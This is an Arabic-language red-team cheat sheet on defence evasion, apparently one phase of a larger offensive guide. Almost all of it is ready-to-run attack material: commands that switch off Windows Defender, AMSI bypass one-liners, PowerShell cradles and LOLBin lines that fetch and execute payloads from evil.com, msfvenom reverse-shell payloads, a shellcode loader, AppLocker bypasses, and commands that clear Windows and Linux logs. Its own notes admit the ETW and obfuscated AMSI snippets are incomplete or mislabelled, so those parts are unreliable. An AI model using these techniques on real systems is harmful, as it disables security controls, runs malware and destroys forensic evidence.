<a id="-phase-6-defense-evasion"></a>
# 🛡️ المرحلة 6: تفادي الدفاعات (Defense Evasion)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**الهدف:** تجاوز الضوابط الأمنية، مثل مكافحة الفيروسات (AV) وكشف التهديدات والاستجابة لها على الأجهزة (EDR) وواجهة فحص البرمجيات الضارة (AMSI) وجدران الحماية، لتجنب الاكتشاف.

---

<a id="-windows-defender-evasion"></a>
## 🛡️ تفادي Windows Defender

<a id="disable-windows-defender-requires-admin"></a>
### تعطيل Windows Defender (يتطلب صلاحيات مسؤول)

> **ملاحظة توافق:** أمثلة التعطيل والتجاوز مرتبطة بالإصدار وسياسات الحماية والصلاحيات؛ لا يضمن تغيير إعداد منفرد تعطيل جميع ميزات الحماية. أمثلة AMSI وLOLBins المعروضة ليست ضماناً لتجاوز الرصد.

```powershell
# تعطيل المراقبة الفورية
Set-MpPreference -DisableRealtimeMonitoring $true

# تعطيل جميع ميزات Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# إضافة مسارات استثناء
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# عبر سجل Windows
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

<a id="check-defender-status"></a>
### فحص حالة Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

<a id="-amsi-bypass"></a>
## 🔓 تجاوز AMSI

<a id="powershell-amsi-bypass"></a>
### تجاوز AMSI في PowerShell
```powershell
# التجاوز 1 — amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# التجاوز 2 — أمر Matt Graeber في سطر واحد
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# التجاوز 3 — تعديل الذاكرة
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

<a id="obfuscated-amsi-bypass"></a>
### تجاوز AMSI مع تمويه الشيفرة

> **تصحيح للمثال:** سلسلة التنسيق في الأصل تتضمن العنصر `{3}` مع ثلاثة معاملات فقط؛ لذلك المثال كما هو غير مكتمل. حُفظ النص الحرفي دون إصلاح الحمولة.

```powershell
# تمويه السلاسل النصية
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

<a id="-payload-obfuscation"></a>
## 📦 تمويه الحمولات

<a id="powershell-obfuscation"></a>
### تمويه PowerShell
```powershell
# ترميز Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# دمج السلاسل النصية
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

<a id="binary-obfuscation"></a>
### تمويه الملفات التنفيذية
```bash
# الترميز باستخدام msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# استخدام XOR مخصص
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

<a id="shellcode-loaders"></a>
### محمّلات Shellcode
```c
// محمّل Shellcode بسيط بلغة C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

<a id="-living-off-the-land-lolbins"></a>
## 🎭 استخدام أدوات النظام الأصلية (LOLBins)

<a id="download--execute"></a>
### التنزيل والتنفيذ
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

<a id="execute-payloads"></a>
### تنفيذ الحمولات
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

<a id="applockerwdac-bypass"></a>
### تجاوز AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

<a id="-etwlogging-bypass"></a>
## 🔒 تجاوز ETW وتسجيل الأحداث

<a id="disable-event-tracing"></a>
### تعطيل تتبع الأحداث

> **تصحيح:** المقطع التالي يعرّف توقيع `EtwEventWrite` باستخدام `Add-Type` فقط؛ لا يتضمن كتابة تصحيح في الذاكرة ولا يعطّل ETW بذاته، خلافاً لما يوحي به العنوان.

```powershell
# تعديل ETW في الذاكرة
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

<a id="clear-event-logs"></a>
### مسح سجلات الأحداث
```powershell
# مسح جميع السجلات
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# أو تعطيل التسجيل
auditpol /clear /y
```

<a id="disable-powershell-logging"></a>
### تعطيل تسجيل أحداث PowerShell
```powershell
# تعطيل تسجيل كتل السكربت
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# تعطيل تسجيل الوحدات
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

<a id="-linux-evasion"></a>
## 🐧 تفادي الرصد في Linux

<a id="timestomping"></a>
### التلاعب بالطوابع الزمنية (Timestomping)
```bash
# تغيير الطوابع الزمنية للملفات
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

<a id="clear-logs"></a>
### مسح السجلات
```bash
# مسح سجل أوامر bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# مسح سجلات النظام
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

<a id="process-hiding"></a>
### إخفاء العمليات
```bash
# إخفاء اسم العملية
exec -a "[kworker/0:0]" ./malicious

# الإخفاء باستخدام LD_PRELOAD
# ترجمة مكتبة تعترض readdir() لإخفاء العمليات
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

| الأداة | الغرض |
|------|---------|
| **Invoke-Obfuscation** | تمويه PowerShell |
| **Veil** | توليد الحمولات |
| **ScareCrow** | مولّد حمولات لتجاوز EDR |
| **Donut** | مولّد Shellcode |
| **Nimcrypt2** | أداة تغليف ملفات PE |
| **PEzor** | محمّل Shellcode بصيغة PE |

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="detection-methods--bypass"></a>
### طرق الكشف وتجاوزها

| الكشف | تقنية التجاوز |
|-----------|------------------|
| الكشف المستند إلى التوقيعات | التمويه والترميز |
| AMSI | تعديل الذاكرة وسكربتات التجاوز |
| ETW | تعديل ETW في الذاكرة |
| تسجيل الأحداث | تعطيل التسجيل ومسح السجلات |
| سياسة AppLocker | أدوات LOLBins ومسارات التجاوز |
| السلوك | استخدام أدوات النظام الأصلية |

<a id="lolbins-quick-list"></a>
### قائمة سريعة بأدوات LOLBins

| الملف التنفيذي | الاستخدام |
|--------|-----|
| certutil | تنزيل الملفات |
| bitsadmin | تنزيل الملفات |
| mshta | تنفيذ HTA |
| rundll32 | تنفيذ DLL/JS |
| regsvr32 | تنفيذ SCT |
| msbuild | تنفيذ XML |
| installutil | تنفيذ EXE |

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**المرحلة السابقة:** [← 05 - ترسيخ الوصول](./05-Persistence.ar.md)

**المرحلة التالية:** [07 - تنفيذ الأهداف →](./07-Actions-Objectives.ar.md)
